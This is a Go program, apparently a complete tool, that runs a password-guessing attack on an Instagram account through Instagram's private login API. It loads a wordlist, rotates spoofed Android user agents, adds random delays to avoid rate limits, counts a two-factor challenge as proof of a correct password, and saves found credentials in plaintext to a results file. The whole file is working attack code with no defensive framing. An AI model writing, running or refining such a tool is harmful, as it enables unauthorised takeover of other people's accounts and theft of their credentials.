package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

const (
	API_URL      = "https://i.instagram.com/api/v1/"
	TIMEOUT      = 10 * time.Second
	CURRENT_TIME = "2025-05-23 23:14:48"
	CURRENT_USER = "monsmain"
)

var userAgents = []string{
    "Instagram 360.0.0.52.192 Android (28/9; 239dpi; 720x1280; google; G011A; G011A; intel; in_ID; 672535977",
    "Instagram 76.0.0.15.395 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 138226743",
    "Instagram 329.0.0.29.120 Android (31/12; 420dpi; 1080x2400; samsung; SM-A515F; a51; exynos9611; en_US; 329000029)",
    "Instagram 328.0.0.13.119 Android (31/12; 480dpi; 1080x2400; samsung; SM-A715F; a71; qcom; en_US; 328000013)",
    "Instagram 327.0.0.17.64 Android (30/11; 440dpi; 1080x2340; Xiaomi; Mi 9T; davinci; qcom; en_US; 327000017)",
    "Instagram 326.0.0.13.109 Android (29/10; 420dpi; 1080x2340; Google; Pixel 4a; sunfish; qcom; en_US; 326000013)",
    "Instagram 325.0.0.15.110 Android (30/11; 480dpi; 1080x2400; Xiaomi; Redmi Note 10 Pro; sweet; qcom; en_US; 325000015)",
    "Instagram 324.0.0.22.99 Android (31/12; 440dpi; 1080x2340; OnePlus; DN2103; OnePlusNord2T; mt6877; en_US; 324000022)",
    "Instagram 323.0.0.20.66 Android (30/11; 480dpi; 1080x2400; Samsung; SM-A325F; a32; qcom; en_US; 323000020)",
    "Instagram 322.0.0.16.170 Android (30/11; 480dpi; 1080x2340; Xiaomi; M2007J3SY; apollon; qcom; en_US; 322000016)",
    "Instagram 321.0.0.13.113 Android (29/10; 420dpi; 1080x2340; Samsung; SM-G973F; beyond1; exynos9820; en_US; 321000013)",
    "Instagram 320.0.0.18.118 Android (31/12; 420dpi; 1080x2340; Xiaomi; Mi 10T Pro; apollo; qcom; en_US; 320000018)",
    "Instagram 319.0.0.31.119 Android (31/12; 480dpi; 1080x2400; Samsung; SM-G991B; o1q; exynos2100; en_US; 319000031)",
    "Instagram 318.0.0.14.109 Android (30/11; 440dpi; 1080x2340; Xiaomi; Mi 11 Lite; courbet; qcom; en_US; 318000014)",
    "Instagram 317.0.0.20.170 Android (30/11; 480dpi; 1080x2340; Samsung; SM-A525F; a52; qcom; en_US; 317000020)",
    "Instagram 316.0.0.20.170 Android (30/11; 480dpi; 1080x2400; Xiaomi; Redmi Note 8 Pro; begonia; mt6785; en_US; 316000020)",
    "Instagram 315.0.0.34.119 Android (31/12; 480dpi; 1080x2340; Samsung; SM-M526B; m52x; qcom; en_US; 315000034)",
    "Instagram 314.0.0.34.119 Android (29/10; 420dpi; 1080x2340; OnePlus; ONEPLUS A6013; OnePlus6T; qcom; en_US; 314000034)",
    "Instagram 313.0.0.34.119 Android (30/11; 440dpi; 1080x2340; Google; Pixel 5; redfin; qcom; en_US; 313000034)",
    "Instagram 312.0.0.12.119 Android (31/12; 480dpi; 1080x2400; Samsung; SM-A715F; a71; qcom; en_US; 312000012)",
    "Instagram 311.0.0.12.119 Android (31/12; 420dpi; 1080x2340; Xiaomi; Mi 9T; davinci; qcom; en_US; 311000012)",
    "Instagram 310.0.0.21.119 Android (30/11; 480dpi; 1080x2400; Xiaomi; M2101K6G; curtana; qcom; en_US; 310000021)",
}

type InstagramResponse struct {
	Status     string `json:"status"`
	Message    string `json:"message"`
	ErrorType  string `json:"error_type"`
	ErrorTitle string `json:"error_title"`
	Challenge  struct {
		URL string `json:"url"`
	} `json:"challenge"`
}

func main() {
	logFile, err := os.OpenFile("debug.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		log.SetOutput(logFile)
		defer logFile.Close()
	}

	fmt.Println("=== Instagram Login Tool ===")
	fmt.Printf("Time: %s\n", CURRENT_TIME)
	fmt.Printf("User: %s\n\n", CURRENT_USER)

	var username string
	fmt.Print("Enter Instagram username: ")
	fmt.Scanln(&username)

	passwords := loadPasswords()
	if len(passwords) == 0 {
		fmt.Println("No passwords found in password.txt!")
		return
	}

	fmt.Printf("\nLoaded %d passwords\n", len(passwords))
	fmt.Println("\nStarting login attempts...\n")

	for i, password := range passwords {
		fmt.Printf("[%d/%d] Testing password: %s\n", i+1, len(passwords), maskPassword(password))

		success, response := tryLogin(username, password)

		if success || response.Message == "challenge_required" || response.ErrorType == "challenge_required" {
			fmt.Printf("\n✅ PASSWORD FOUND: %s\n", password)
			fmt.Printf("Username: %s\n", username)
			fmt.Println("✅ Password is correct! (2FA/Challenge Required)")
			saveResult(username, password, true)
			return
		} else {
			if response.ErrorType == "bad_password" {
				fmt.Println("❌ Invalid password")
			} else if response.ErrorType == "invalid_user" {
				fmt.Println("❌ Invalid username")
				return
			} else {
				fmt.Printf("⚠️ Error: %s\n", response.Message)
			}
		}

		time.Sleep(time.Duration(rand.Intn(5)+5) * time.Second)
	}

	fmt.Println("\n❌ No valid password found!")
	saveResult(username, "", false)
}

func tryLogin(username, password string) (bool, InstagramResponse) {
	loginUrl := API_URL + "accounts/login/"

	data := url.Values{}
	data.Set("username", username)
	data.Set("password", password)
	data.Set("device_id", fmt.Sprintf("android-%d", time.Now().UnixNano()))

	req, err := http.NewRequest("POST", loginUrl, strings.NewReader(data.Encode()))
	if err != nil {
		log.Printf("Error creating request: %v\n", err)
		return false, InstagramResponse{}
	}

	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US")
	req.Header.Set("X-IG-Capabilities", "3brTvw==")
	req.Header.Set("X-IG-Connection-Type", "WIFI")

	client := &http.Client{Timeout: TIMEOUT}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("Error sending request: %v\n", err)
		return false, InstagramResponse{}
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Printf("Error reading response: %v\n", err)
		return false, InstagramResponse{}
	}

	log.Printf("Raw response: %s\n", string(body))

	var response InstagramResponse
	if err := json.Unmarshal(body, &response); err != nil {
		log.Printf("Error parsing response: %v\n", err)
		return false, InstagramResponse{}
	}

	success := response.Status == "ok" ||
		strings.Contains(string(body), "logged_in_user")

	return success, response
}

func loadPasswords() []string {
	file, err := os.Open("password.txt")
	if err != nil {
		log.Printf("Error opening password file: %v", err)
		return []string{}
	}
	defer file.Close()

	var passwords []string
	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		pass := strings.TrimSpace(scanner.Text())
		if pass != "" {
			passwords = append(passwords, pass)
		}
	}

	return passwords
}

func saveResult(username, password string, success bool) {
	currentTime := CURRENT_TIME
	var status string
	if success {
		status = "✅ SUCCESS"
	} else {
		status = "❌ FAILED"
	}

	logEntry := fmt.Sprintf("[%s] %s\nUsername: %s\nPassword: %s\n\n",
		currentTime, status, username, password)

	file, err := os.OpenFile("results.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("Error saving result: %v", err)
		return
	}
	defer file.Close()

	file.WriteString(logEntry)
}

func maskPassword(password string) string {
	if len(password) <= 4 {
		return "****"
	}
	return password[:2] + strings.Repeat("*", len(password)-4) + password[len(password)-2:]
}
